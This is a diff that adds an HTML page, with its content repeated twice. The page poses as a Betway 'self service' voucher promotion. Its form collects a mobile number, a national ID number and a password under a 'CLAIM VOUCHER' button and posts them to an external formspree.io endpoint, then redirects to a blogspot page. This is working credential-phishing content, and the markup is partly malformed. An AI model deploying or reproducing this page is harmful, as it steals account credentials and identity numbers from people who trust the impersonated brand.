@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="F*CK THE WORLD">
+    <meta name="author" content="mr luvano">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="Lloyd.css">
+    <title>BETWAY SELF SERVICE || BETWAY PROMOTIONS</title>
+</head>
+<body>
+    <form  
+  action="https://formspree.io/f/mknldvvr"
+  method="POST
+
+<input type="hidden "
+"name="_next"value="https://freebetwaycoucher.blogspot.com/p/betway-self-service-betway-promotions_6.html">
+
+
+        <im  src="./href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYP2kcD0MsQICI3mNxz6tljuDD8lwZYUCJdM0rp4kwmvuKlPpdZMQwy6jndnwgWWo04cnRDERbctAPC8N5vSGtNKZERq0b-41K-y6YyJ_Pe6Dl8R8lsn3Z0VgF9qdMSwakQ3KfEu3qcPn-ot4qaY4VCTPgAmHrGhtvfQ5B0w_lovdSc7DDWKMvVaf09g/s310/1684047133664.jpg" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" width="300" data-original-height="162" data-original-width="310" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYP2kcD0MsQICI3mNxz6tljuDD8lwZYUCJdM0rp4kwmvuKlPpdZMQwy6jndnwgWWo04cnRDERbctAPC8N5vSGtNKZERq0b-41K-y6YyJ_Pe6Dl8R8lsn3Z0VgF9qdMSwakQ3KfEu3qcPn-ot4qaY4VCTPgAmHrGhtvfQ5B0w_lovdSc7DDWKMvVaf09g/s400/1684047133664.jpg"/></a>
+         
+         
+                      
+        <h3>Credentials Required.</h3>
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid fa-user" id="user-icon"></i></div>
+            <input type="number" placeholder="Mobile Number." name="tel-num" required>
+        </div>
+        
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid far fa-id-card" id="user-icon"></i></div>
+            <input type="number" placeholder="ID Number." name="id-number" required>
+        </div>
+
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid fas fa-lock" id="user-icon"></i></div>
+            <input type="password" placeholder="Password." name="password" required id="pass">
+            <div class="eye-wrapper"id="user-space" ><i class="fa-solid fa-eye" id="eye" onclick="hide()"></i></div>
+        </div>
+
+        <button type="submit" class="btn">CLAIM VOUCHER</button>
+        <i>please wait 2minutes to receive your voucher <br> submiting your Credentials.</i>
+<input type="hidden" name="_cc" value="3b04768f200ed2ad610c96dde4dad6b8">
+    </form>
+    <script src="app.js"></script>
+    
+        
+        
+    <style>
+        
+      * {
+    padding: 0%;
+    margin: 0%;
+    box-sizing: border-box;
+    overflow: hidden;
+    font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+body {
+    width: 100vw;
+    height: 100vh;
+    background: #fff;
+    display: grid;
+    place-items: center;
+}
+
+form {
+    background: #f7f7f7;
+    width: 80%;
+    display: grid;
+    place-items: center;
+    border-radius: 5px;
+    padding-top: 0;
+    box-shadow: 0 0 9px .5px #555;
+}
+.user-space {
+    border: 2.5px solid #193;
+    display: flex;
+    z-index: 99999;
+    border-radius: 5px;
+    margin-top: 2.5%;
+    margin-left: 5%;
+    width: 90%;
+}
+
+.user-space input {
+    width: 90%;
+    padding: 3.5%;
+    border: 0;
+    border-radius: 0;
+    outline-color: #193;
+    outline-offset: 1.2px;
+    caret-color: darkgreen;
+}
+
+input::placeholder {
+    color: #333;
+}
+
+.user-icon-wrapper {
+    z-index: 999999;
+    background-color: #193;
+    min-width: 10%;
+    max-width: 10%;
+    display: grid;
+    place-items: center;
+}
+
+#user-icon {
+    color: #fff;
+}
+
+img {
+    width: 100%;
+    z-index: 9999999;
+    margin-bottom: 2%;
+}
+
+.btn {
+    width: 90%;
+    padding: 2%;
+    margin-top: 2.5%;
+    background: #193;
+    border-radius: 5px;
+    font-weight: 700;
+    color: #fff;
+    border: 2px solid #193;
+    cursor: pointer;
+}
+
+.eye-wrapper {
+    display: grid;
+    place-items: center;
+    min-width: 10%;
+    max-width: 10%;
+    border-radius: 0;
+    background: #193;
+}
+
+.fa-eye, .fa-eye-slash {
+    color: #333;
+    font-size: 1.1rem;
+    cursor: pointer;
+    color: #f7f7f7;
+}
+
+h3 {
+    color: darkgreen;
+    margin: 2%;
+}
+
+i {
+    font-size: .9rem;
+    margin-top: 2.5%;
+    color: orangered;
+    margin-bottom: 2.3%;
+}
+
+@media  screen and (max-width: 450px) {
+.user-icon-wrapper, .eye-wrapper  {
+    padding:1.5% 9%;
+}
+
+i {
+    font-size: .8rem;
+}
+}
+ 
+        
+    </style>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="F*CK THE WORLD">
+    <meta name="author" content="mr luvano">
+    
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="Lloyd.css">
+    <title>BETWAY SELF SERVICE || BETWAY PROMOTIONS</title>
+</head>
+<body>
+    <form  
+  action="https://formspree.io/f/mknldvvr"
+  method="POST
+
+<input type="hidden "
+"name="_next"value="https://freebetwaycoucher.blogspot.com/p/betway-self-service-betway-promotions_6.html">
+
+
+        <im  src="./href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYP2kcD0MsQICI3mNxz6tljuDD8lwZYUCJdM0rp4kwmvuKlPpdZMQwy6jndnwgWWo04cnRDERbctAPC8N5vSGtNKZERq0b-41K-y6YyJ_Pe6Dl8R8lsn3Z0VgF9qdMSwakQ3KfEu3qcPn-ot4qaY4VCTPgAmHrGhtvfQ5B0w_lovdSc7DDWKMvVaf09g/s310/1684047133664.jpg" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" width="300" data-original-height="162" data-original-width="310" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYP2kcD0MsQICI3mNxz6tljuDD8lwZYUCJdM0rp4kwmvuKlPpdZMQwy6jndnwgWWo04cnRDERbctAPC8N5vSGtNKZERq0b-41K-y6YyJ_Pe6Dl8R8lsn3Z0VgF9qdMSwakQ3KfEu3qcPn-ot4qaY4VCTPgAmHrGhtvfQ5B0w_lovdSc7DDWKMvVaf09g/s400/1684047133664.jpg"/></a>
+         
+         
+                      
+        <h3>Credentials Required.</h3>
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid fa-user" id="user-icon"></i></div>
+            <input type="number" placeholder="Mobile Number." name="tel-num" required>
+        </div>
+        
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid far fa-id-card" id="user-icon"></i></div>
+            <input type="number" placeholder="ID Number." name="id-number" required>
+        </div>
+
+        <div class="user-space">
+            <div class="user-icon-wrapper"><i class="fa-solid fas fa-lock" id="user-icon"></i></div>
+            <input type="password" placeholder="Password." name="password" required id="pass">
+            <div class="eye-wrapper"id="user-space" ><i class="fa-solid fa-eye" id="eye" onclick="hide()"></i></div>
+        </div>
+
+        <button type="submit" class="btn">CLAIM VOUCHER</button>
+        <i>please wait 2minutes to receive your voucher <br> submiting your Credentials.</i>
+<input type="hidden" name="_cc" value="3b04768f200ed2ad610c96dde4dad6b8">
+    </form>
+    <script src="app.js"></script>
+    
+        
+        
+    <style>
+        
+      * {
+    padding: 0%;
+    margin: 0%;
+    box-sizing: border-box;
+    overflow: hidden;
+    font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+body {
+    width: 100vw;
+    height: 100vh;
+    background: #fff;
+    display: grid;
+    place-items: center;
+}
+
+form {
+    background: #f7f7f7;
+    width: 80%;
+    display: grid;
+    place-items: center;
+    border-radius: 5px;
+    padding-top: 0;
+    box-shadow: 0 0 9px .5px #555;
+}
+.user-space {
+    border: 2.5px solid #193;
+    display: flex;
+    z-index: 99999;
+    border-radius: 5px;
+    margin-top: 2.5%;
+    margin-left: 5%;
+    width: 90%;
+}
+
+.user-space input {
+    width: 90%;
+    padding: 3.5%;
+    border: 0;
+    border-radius: 0;
+    outline-color: #193;
+    outline-offset: 1.2px;
+    caret-color: darkgreen;
+}
+
+input::placeholder {
+    color: #333;
+}
+
+.user-icon-wrapper {
+    z-index: 999999;
+    background-color: #193;
+    min-width: 10%;
+    max-width: 10%;
+    display: grid;
+    place-items: center;
+}
+
+#user-icon {
+    color: #fff;
+}
+
+img {
+    width: 100%;
+    z-index: 9999999;
+    margin-bottom: 2%;
+}
+
+.btn {
+    width: 90%;
+    padding: 2%;
+    margin-top: 2.5%;
+    background: #193;
+    border-radius: 5px;
+    font-weight: 700;
+    color: #fff;
+    border: 2px solid #193;
+    cursor: pointer;
+}
+
+.eye-wrapper {
+    display: grid;
+    place-items: center;
+    min-width: 10%;
+    max-width: 10%;
+    border-radius: 0;
+    background: #193;
+}
+
+.fa-eye, .fa-eye-slash {
+    color: #333;
+    font-size: 1.1rem;
+    cursor: pointer;
+    color: #f7f7f7;
+}
+
+h3 {
+    color: darkgreen;
+    margin: 2%;
+}
+
+i {
+    font-size: .9rem;
+    margin-top: 2.5%;
+    color: orangered;
+    margin-bottom: 2.3%;
+}
+
+@media  screen and (max-width: 450px) {
+.user-icon-wrapper, .eye-wrapper  {
+    padding:1.5% 9%;
+}
+
+i {
+    font-size: .8rem;
+}
+}
+ 
+        
+    </style>
+</body>
+</html>
